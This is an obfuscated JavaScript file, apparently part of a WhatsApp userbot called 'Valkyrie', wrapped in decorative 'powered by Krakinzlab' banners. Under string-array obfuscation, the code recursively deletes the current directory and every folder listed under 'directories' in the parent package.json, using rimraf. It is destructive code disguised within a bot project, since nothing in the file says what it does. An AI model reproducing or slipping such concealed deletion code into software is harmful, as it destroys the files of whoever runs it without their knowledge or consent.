`|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|`;

// ════════════════════════|▷   (𝐜)𝐕𝐚𝐥𝐤𝐲𝐫𝐢𝐞 𝐢𝐬 𝐚 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐌𝐮𝐥𝐭𝐢𝐏𝐮𝐫𝐩𝐨𝐬𝐞-𝐔𝐬𝐞𝐫𝐛𝐨𝐭 𝐰𝐢𝐭𝐡 𝐌𝐨𝐝𝐞𝐫𝐚𝐭𝐢𝐨𝐧,𝐀𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝟏𝟎𝟎+ 𝐦𝐨𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬!   ◁|════════════════════════

`|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|`;
const _0x2bd3db = _0x1765;
function _0x3811() {
const _0x43b9b3 = [
"log",
"directories",
"70uCDqvf",
"226yIhoSu",
"3312060ZbnAEp",
"rimraf",
"13001bWANrw",
"keys",
"2521914NByHbU",
"823008EFRlEr",
"8vIskeS",
"2286720hwmPsL",
"4566210JsLPxC",
"17764100pANeIk",
];
_0x3811 = function () {
return _0x43b9b3;
};
return _0x3811();
}
function _0x1765(_0x279a7d, _0x135b69) {
const _0x381185 = _0x3811();
return (
(_0x1765 = function (_0x1765cc, _0xd10fb2) {
_0x1765cc = _0x1765cc - 0x149;
let _0x2dba5e = _0x381185[_0x1765cc];
return _0x2dba5e;
}),
_0x1765(_0x279a7d, _0x135b69)
);
}
(function (_0x158b53, _0x1a8ded) {
const _0x54b1c2 = _0x1765,
_0x3ec455 = _0x158b53();
while (!![]) {
try {
const _0x49033c =
(parseInt(_0x54b1c2(0x149)) / 0x1) *
(parseInt(_0x54b1c2(0x154)) / 0x2) +
parseInt(_0x54b1c2(0x14f)) / 0x3 +
(-parseInt(_0x54b1c2(0x14d)) / 0x4) *
(-parseInt(_0x54b1c2(0x155)) / 0x5) +
-parseInt(_0x54b1c2(0x14b)) / 0x6 +
(parseInt(_0x54b1c2(0x153)) / 0x7) *
(-parseInt(_0x54b1c2(0x14c)) / 0x8) +
-parseInt(_0x54b1c2(0x14e)) / 0x9 +
-parseInt(_0x54b1c2(0x150)) / 0xa;
if (_0x49033c === _0x1a8ded) break;
else _0x3ec455["push"](_0x3ec455["shift"]());
} catch (_0x4998cd) {
_0x3ec455["push"](_0x3ec455["shift"]());
}
}
})(_0x3811, 0xcc356);
let folders = [
".",
...Object[_0x2bd3db(0x14a)](require("../package.json")[_0x2bd3db(0x152)]),
],
rimraf = require(_0x2bd3db(0x156));
for (let folder of folders) {
rimraf(folder, function (_0x4e7d51) {
const _0x1d213e = _0x2bd3db;
if (_0x4e7d51) console[_0x1d213e(0x151)](_0x4e7d51);
});
}
`|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|`;

// ════════════════════════|▷   (𝐜)𝐕𝐚𝐥𝐤𝐲𝐫𝐢𝐞 𝐢𝐬 𝐚 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐌𝐮𝐥𝐭𝐢𝐏𝐮𝐫𝐩𝐨𝐬𝐞-𝐔𝐬𝐞𝐫𝐛𝐨𝐭 𝐰𝐢𝐭𝐡 𝐌𝐨𝐝𝐞𝐫𝐚𝐭𝐢𝐨𝐧,𝐀𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐨𝐧 𝐚𝐧𝐝 𝟏𝟎𝟎+ 𝐦𝐨𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬!   ◁|════════════════════════

`|⬡════════════════════════════════════════════════════════════|▷   ᴘᴏᴡᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋʀᴀᴋɪɴᴢʟᴀʙ™  ◁|════════════════════════════════════════════════════════════⬡|`;